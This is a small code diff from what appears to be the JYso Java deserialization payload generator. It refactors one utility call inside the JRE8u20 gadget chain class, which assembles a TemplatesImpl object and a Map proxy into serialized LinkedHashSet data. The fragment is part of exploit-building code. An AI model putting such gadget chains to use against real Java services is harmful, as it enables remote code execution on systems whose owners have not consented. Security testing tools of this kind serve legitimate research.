@@ -88,7 +88,7 @@ public class JRE8u20 implements ObjectPayload<Object> {
         hashsetData.addData(1.0F, true);
         hashsetData.addData(2, true);
         hashsetData.addData(templates);
-        TCObject proxy = Util.makeProxy(new Class[]{Map.class}, handler, ser);
+        TCObject proxy = com.qi4l.JYso.gadgets.utils.Utils.makeProxy(new Class[]{Map.class}, handler, ser);
         hashsetData.addData(proxy);
         linkedHashset.addClassDescData(linkedhashsetDesc, linkedhashsetData);
         linkedHashset.addClassDescData(hashsetDesc, hashsetData, true);
